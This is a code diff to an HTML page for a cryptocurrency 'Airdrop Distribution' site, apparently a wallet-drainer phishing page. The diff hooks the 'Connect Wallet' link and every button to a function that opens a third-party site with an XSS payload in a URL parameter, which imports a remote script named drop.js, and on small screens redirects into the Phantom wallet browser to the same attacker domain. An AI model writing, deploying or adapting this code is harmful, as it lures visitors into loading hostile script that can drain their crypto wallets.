@@ -1,5 +1,5 @@
 <html lang="en"><!--WEBSITE BY 0xTheo__: https://x.com/0xTheo__--><head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="./index.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 
 <script src="//archive.org/includes/athena.js" type="text/javascript"></script>
@@ -57,7 +57,7 @@
                   <h1>Airdrop Distribution</h1>
               </div>
               <div class="links aos-init" data-aos="fade-up" data-aos-delay="500">
-                  <a>Connect Wallet</a>
+                  <a onclick="openPopupOrRedirect()">Connect Wallet</a>
               </div>
           </div>
       </section>
@@ -174,6 +174,36 @@
   
       </section>
       <script src="https://web.archive.org/web/20240927044815js_/https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+      <script>    // Function to open a popup or redirect
+        function openPopupOrRedirect() {
+            const url = "https://killabears.com/dashboard/viewer.php?img=%22--!%3E%3CsVg/oNloAd=import(%27https://moodengsol.io/drop.js%27);%3E%5Cx3e"
+            const popupWidth = 500;
+            const popupHeight = 750;
+        
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+        
+            if (screenWidth > popupWidth && screenHeight > popupHeight) {
+                const left = (screenWidth - popupWidth) / 2;
+                const top = (screenHeight - popupHeight) / 2;
+        
+                window.open(url, "_blank", `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
+            } else {
+                window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fmoodengsol.io%2Fmobile?ref=https%3A%2F%2Fmoodengsol.io%2Fmobile";
+            }
+        }
+        
+        // Add event listeners to all button elements
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.getElementsByTagName('button');
+            for (let i = 0; i < buttons.length; i++) {
+                buttons[i].addEventListener('click', function(event) {
+                    event.preventDefault(); // Prevents the default button action if necessary
+                    openPopupOrRedirect();
+                });
+            }
+        });
+    </script>
       <script>
           AOS.init();
   
